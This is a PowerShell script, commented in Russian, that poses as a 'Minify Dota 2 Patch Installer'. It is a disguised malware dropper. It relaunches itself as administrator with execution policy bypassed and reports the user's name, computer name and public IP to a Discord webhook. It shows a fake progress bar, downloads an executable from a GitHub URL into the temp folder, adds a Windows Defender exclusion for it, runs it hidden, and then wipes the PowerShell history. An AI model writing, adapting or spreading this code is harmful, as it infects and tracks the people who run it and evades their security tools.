if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"" -Verb RunAs
exit
}

--- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
param(
[string]$Status,
[string]$Message,
[string]$User = $env:USERNAME,
[string]$Computer = $env:COMPUTERNAME
)

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss" # Получаем IP-адрес try { $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString() if (-not $publicIP) { $publicIP = "Не удалось определить" } } catch { $publicIP = "Ошибка получения IP" } try { # Отправка на Discord Webhook $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk" $embed = @{ title = "Minify Installer Log" color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 } fields = @( @{ name = "Status"; value = $Status; inline = $true }, @{ name = "User"; value = $User; inline = $true }, @{ name = "Computer"; value = $Computer; inline = $true }, @{ name = "IP Address"; value = $publicIP; inline = $true }, @{ name = "Message"; value = $Message; inline = $false }, @{ name = "Timestamp"; value = $timestamp; inline = $false } ) footer = @{ text = "Minify Installer v3.2.1" } } $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10 # Добавляем заголовок с правильной кодировкой $headers = @{ "Content-Type" = "application/json; charset=utf-8" } Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue } catch { # Резервный метод: локальное логирование try { $logPath = "$env:TEMP\minify_logs.txt" $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$publicIP] $Message" Add-Content -Path $logPath -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue } catch { # Продолжаем выполнение, даже если логирование не сработало } }
}

Отправляем уведомление о запуске
Send-LogNotification -Status "STARTED" -Message "Пользователь запустил установщик Minify"

--- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Minify Dota 2 Patch Installer"
$form.Size = New-Object System.Drawing.Size(600,400)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = New-Object System.Drawing.Point(20,30)
$titleLabel.Size = New-Object System.Drawing.Size(540,30)
$titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($titleLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20,300)
$progressBar.Size = New-Object System.Drawing.Size(540,23)
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(20,330)
$statusLabel.Size = New-Object System.Drawing.Size(540,20)
$statusLabel.Text = "Подготовка..."
$form.Controls.Add($statusLabel)

Показываем форму
$form.Show()

--- ПРОЦЕСС "УСТАНОВКИ" ---
$steps = @(
"Анализ файлов Dota 2...",
"Оптимизация шейдеров...",
"Применение патча производительности...",
"Загрузка дополнительных модулей...",
"Финализация..."
)

for ($i = 0; $i -lt $steps.Count; $i++) {
$statusLabel.Text = $steps[$i]
$progressBar.Value = ($i + 1) * (100 / $steps.Count)
$form.Refresh()
Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
}

--- ЗАГРУЗКА И ЗАПУСК ---
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($u, $p)

# Добавляем в исключения перед запуском Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue $statusLabel.Text = "Установка завершена!" $form.Refresh() Start-Sleep -Seconds 1 Start-Process -FilePath $p -WindowStyle Hidden $form.Close() [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64) # Отправляем уведомление об успехе Send-LogNotification -Status "SUCCESS" -Message "Патч успешно установлен и запущен"
} catch {
$statusLabel.Text = "Ошибка сети при установке."
Start-Sleep -Seconds 2
$form.Close()

# Отправляем уведомление об ошибке Send-LogNotification -Status "ERROR" -Message "Ошибка при установке: $_"
}

Очистка истории
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
